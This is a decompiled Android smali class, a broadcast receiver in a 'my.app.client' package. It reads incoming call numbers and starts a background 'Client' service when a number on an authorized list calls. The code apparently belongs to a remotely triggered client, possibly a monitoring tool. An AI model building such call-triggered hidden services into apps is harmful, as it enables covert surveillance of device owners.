.class Lmy/app/client/ClientListener$2;
.super Landroid/content/BroadcastReceiver;
.source "ClientListener.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/client/ClientListener;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "CallReceiver"


# instance fields
.field final synthetic this$0:Lmy/app/client/ClientListener;


# direct methods
.method constructor <init>(Lmy/app/client/ClientListener;)V
    .locals 0
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/client/ClientListener$2;->this$0:Lmy/app/client/ClientListener;

    .line 186
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 191
    const-string v7, "CallReceiver"

    const-string v8, "Call state changed !"

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 192
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 194
    .local v0, action:Ljava/lang/String;
    const-string v7, "android.intent.action.PHONE_STATE"

    invoke-virtual {v0, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 196
    const-string v7, "state"

    invoke-virtual {p2, v7}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 197
    .local v4, phoneState:Ljava/lang/String;
    const-string v7, "incoming_number"

    invoke-virtual {p2, v7}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 199
    .local v3, phoneNumber:Ljava/lang/String;
    sget-object v7, Landroid/telephony/TelephonyManager;->EXTRA_STATE_RINGING:Ljava/lang/String;

    invoke-virtual {v4, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 200
    const-string v7, "CallReceiver"

    const-string v8, "Incoming call"

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 202
    iget-object v7, p0, Lmy/app/client/ClientListener$2;->this$0:Lmy/app/client/ClientListener;

    iget-object v7, v7, Lmy/app/client/ClientListener;->authorizedNumbersCall:Ljava/util/ArrayList;

    if-eqz v7, :cond_4

    .line 203
    const/4 v2, 0x0

    .line 204
    .local v2, found:Z
    iget-object v7, p0, Lmy/app/client/ClientListener$2;->this$0:Lmy/app/client/ClientListener;

    iget-object v7, v7, Lmy/app/client/ClientListener;->authorizedNumbersCall:Ljava/util/ArrayList;

    invoke-virtual {v7}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :cond_0
    :goto_0
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-nez v8, :cond_2

    .line 208
    if-nez v2, :cond_3

    .line 224
    .end local v2           #found:Z
    .end local v3           #phoneNumber:Ljava/lang/String;
    .end local v4           #phoneState:Ljava/lang/String;
    :cond_1
    :goto_1
    return-void

    .line 204
    .restart local v2       #found:Z
    .restart local v3       #phoneNumber:Ljava/lang/String;
    .restart local v4       #phoneState:Ljava/lang/String;
    :cond_2
    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    .line 205
    .local v5, s:Ljava/lang/String;
    invoke-virtual {v5, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 206
    const/4 v2, 0x1

    goto :goto_0

    .line 210
    .end local v5           #s:Ljava/lang/String;
    :cond_3
    const-string v7, "CallReceiver"

    const-string v8, "Incoming call authorized"

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 213
    .end local v2           #found:Z
    :cond_4
    new-instance v6, Landroid/content/Intent;

    const-class v7, Lmy/app/client/Client;

    invoke-direct {v6, p1, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 214
    .local v6, serviceIntent:Landroid/content/Intent;
    const-string v7, "CallReceiver"

    invoke-virtual {v6, v7}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 215
    invoke-virtual {p1, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_1

    .line 220
    .end local v3           #phoneNumber:Ljava/lang/String;
    .end local v4           #phoneState:Ljava/lang/String;
    .end local v6           #serviceIntent:Landroid/content/Intent;
    :cond_5
    invoke-virtual {p2}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object v1

    .line 221
    .local v1, data:Ljava/lang/String;
    const-string v7, "CallReceiver"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "broadcast : action="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ", data="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method
